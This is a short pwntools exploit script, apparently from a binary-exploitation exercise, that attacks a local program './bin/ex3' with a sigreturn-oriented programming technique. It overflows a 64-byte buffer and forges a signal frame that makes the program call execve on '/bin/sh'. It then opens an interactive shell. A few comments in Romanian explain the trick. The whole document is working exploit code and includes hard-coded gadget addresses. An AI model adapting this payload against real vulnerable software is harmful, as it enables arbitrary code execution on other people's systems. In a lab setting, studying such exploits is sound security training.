from pwn import *

context.arch = 'amd64'
target = process('./bin/ex3')
'''
ROPgadget --binary ./bin/ex3 | grep syscall
0x0000000000401019 : syscall

disass read_buf
0x000000000040101c <+0>:     sub    rsp,0x40
'''
syscall_ret_addr = 0x401019
gift_binsh_addr = 0x402000
sub_rsp_64 = 0x40101c

frame = SigreturnFrame()
frame.rax = 0x3b                # 59 = execve syscall code
frame.rdi = gift_binsh_addr
frame.rsi = 0x0
frame.rdx = 0x0
frame.rsp = 0x0
frame.rip = syscall_ret_addr

payload = 64 * b"a" + p64(sub_rsp_64) + p64(syscall_ret_addr) + bytes(frame)
print(len(bytes(payload)))

target.sendline(payload)
# 15 = sys_rt_sigreturn - controlez toti registrii 
# ar fi fost la fel si daca aveam gadget-uri ROP pt fiecare (ex: pop rdi, pop rax etc)?
target.sendline(b"a" * 0xe)     # <=> send(b"a" * 0xf)

target.interactive()
